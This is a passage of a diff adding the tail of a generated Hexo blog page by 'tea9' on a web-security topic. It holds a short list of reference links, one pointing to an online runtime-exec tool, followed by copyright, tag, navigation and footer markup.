class="string">&quot;invalid type&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><strong>links</strong></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/panisme/p/12552838.html">https://www.cnblogs.com/panisme/p/12552838.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/yukinorong/article/details/107015350">https://blog.csdn.net/yukinorong/article/details/107015350</a></p>
+<p><a target="_blank" rel="noopener" href="https://ares-x.com/tools/runtime-exec/">https://ares-x.com/tools/runtime-exec/</a></p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>tea9</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://tea9.xyz/post/2690490518.html">http://tea9.xyz/post/2690490518.html</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2017-2022 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/web%E5%AE%89%E5%85%A8/"># web安全</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/post/2744736261.html">python解析json脚本记录</a>
+            
+            
+            <a class="next" rel="next" href="/post/2467316813.html">git下载私有目录命令</a>
+            
+        </section>
+    </article>
+</div>
+
+
+
+
+            </div>
+            <footer id="footer" class="footer">
+ 
+    <div class="copyright">
+        <span>© tea9 | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+   
+</footer>
+
+    </div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"live2d-widget-model-hijiki"},"display":{"position":"right","width":200,"height":350},"mobile":{"show":true},"log":false});</script></body>
+
+</html>
